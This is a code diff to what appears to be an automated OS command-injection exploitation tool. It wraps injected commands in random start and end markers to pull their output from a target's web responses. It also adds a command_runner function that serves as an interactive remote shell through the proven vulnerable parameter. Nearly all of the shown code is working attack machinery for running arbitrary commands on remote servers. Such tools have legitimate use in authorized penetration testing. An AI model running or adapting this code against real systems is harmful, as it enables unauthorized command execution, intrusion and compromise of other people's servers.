@@ -326,8 +326,10 @@ def run_command(ctx: RunContext) -> None:
     # echo of the value it was given before the injection existed. Requiring the
     # marker in the response that is about to be shown keeps the two together.
     marker = "ik" + secrets.token_hex(6)
+    closing = "ik" + secrets.token_hex(6)
     payload = (
-        f"{delivery.prefix}{shell.literal(marker)}{shell.join}{command}{delivery.suffix}"
+        f"{delivery.prefix}{shell.literal(marker)}{shell.join}{command}"
+        f"{shell.join}{shell.literal(closing)}{delivery.suffix}"
     )
     outcome = inject_escalating(
         ctx,
@@ -336,9 +338,17 @@ def run_command(ctx: RunContext) -> None:
         "exploit.command",
         kind=Kind.COMMAND,
         exclude_families=frozenset(shell.cannot),
-        until=lambda exchange, want=marker: want in exchange.response.text,
+        # Both markers, not merely "nothing objected". The pollution attempt is
+        # sent first and a framework that reads the first of a repeated parameter
+        # never sees the payload at all - so without this, a request that carried
+        # nothing looks like success. And a marker only at the front cannot say
+        # where the output stopped, which is how the page's own markup ends up
+        # printed as if the command had produced it.
+        until=lambda exchange, a=marker, b=closing: (
+            a in exchange.response.text and b in exchange.response.text
+        ),
     )
-    if outcome is None or marker not in outcome[1].response.text:
+    if outcome is None or closing not in outcome[1].response.text:
         ctx.emit(f"[!] the marker did not come back over {param.key()}; nothing was run")
         ctx.blackboard.set(
             "cmdi.command",
@@ -354,15 +364,39 @@ def run_command(ctx: RunContext) -> None:
         return
 
     _, exchange, _variant = outcome
-    ctx.emit("")
-    ctx.emit(f"[+] running on the target: {command}")
-    ctx.emit(exchange.response.text.rstrip())
+    shown = _command_output(exchange.response.text, marker, closing)
+    if not shown:
+        shown = "(the command printed nothing)"
+    # The output goes in the result at the end, where a result belongs, and once:
+    # the progress line says a command ran, the summary says what it printed.
+    # Printing it here as well is how the same answer ends up scattered up the
+    # screen in the middle of the probe narration.
+    ctx.blackboard.remember_run(command, "" if shown.startswith("(") else shown)
+    ctx.announce(f"ran.{command}", f"[+] running on the target: {command}")
     ctx.blackboard.set(
         "cmdi.command",
         command,
         evidence=f"the self-check marker returned in the same request over {param.key()}",
         confidence=Confidence.CONFIRMED,
     )
+
+
+def _command_output(body: str, marker: str, closing: str) -> str:
+    """What the command printed, out of the page that carried it.
+
+    The markers go out immediately before and after the command, so what sits
+    between them is the answer and nothing else. Both are looked for from the end
+    of the body, because an application that prints the line it is about to run
+    puts them in the page as well - and printing a page as though it were the
+    output of `id` is the shape the markers were added to prevent.
+    """
+    start = body.rfind(marker)
+    if start == -1:
+        return ""
+    end = body.rfind(closing)
+    if end <= start:
+        return ""
+    return body[start + len(marker) : end].strip()
 
 
 def _proved_param(ctx: RunContext):
@@ -372,6 +406,51 @@ def _proved_param(ctx: RunContext):
         if param.key() == wanted:
             return param
     return None
+
+
+def command_runner(ctx: RunContext):
+    """Run one command through the delivery that was proved, and return its output.
+
+    This is the whole interface an interactive session needs - a function from a
+    command to its output - which is why the shell lives in the engine and not
+    here. What this adds is the part only this module knows: which parameter,
+    which delivery, and which language the command has to be written in.
+
+    The two markers go around the command in the same request, so what comes back
+    between them is the command's output rather than the page around it.
+    """
+    param = _proved_param(ctx)
+    shell_name = ctx.blackboard.get(SHELL) or "posix"
+    shell = next((entry for entry in SHELLS if entry.name == shell_name), POSIX)
+    delivery_name = ctx.blackboard.get(DELIVERY) or "direct"
+    delivery = next((entry for entry in DELIVERIES if entry.name == delivery_name), DELIVERIES[0])
+    excluded = frozenset(shell.cannot)
+
+    def execute(command: str) -> str:
+        if param is None:
+            return ""
+        marker = "ik" + secrets.token_hex(6)
+        closing = "ik" + secrets.token_hex(6)
+        payload = (
+            f"{delivery.prefix}{shell.literal(marker)}{shell.join}{command}"
+            f"{shell.join}{shell.literal(closing)}{delivery.suffix}"
+        )
+        outcome = inject_escalating(
+            ctx,
+            param,
+            payload,
+            "os-shell",
+            kind=Kind.COMMAND,
+            exclude_families=excluded,
+            until=lambda exchange, a=marker, b=closing: (
+                a in exchange.response.text and b in exchange.response.text
+            ),
+        )
+        if outcome is None:
+            return ""
+        return _command_output(outcome[1].response.text, marker, closing)
+
+    return execute
 
 
 def report_summary(ctx: RunContext) -> None:
@@ -390,9 +469,17 @@ def report_summary(ctx: RunContext) -> None:
         ctx.emit(f"[-] result: no command execution was established - {verdict(ctx)}")
 
     if not ctx.config.get("os_cmd"):
-        ctx.blackboard.mark_not_covered(
-            "exploit.command", "no --os-cmd was given, so nothing was run through the injection"
-        )
+        # Two different reasons for nothing having run, and only one of them is
+        # something the operator has to fix. Saying "no --os-cmd was given" to
+        # someone who passed one and a --dry-run sends them looking for a flag
+        # they already used.
+        if ctx.config.get("dry_run"):
+            reason = (
+                "not run: --dry-run was given, so the injection was proved and left alone"
+            )
+        else:
+            reason = "no --os-cmd was given, so nothing was run through the injection"
+        ctx.blackboard.mark_not_covered("exploit.command", reason)
 
 
 # ----------------------------------------------------------------- graph shape
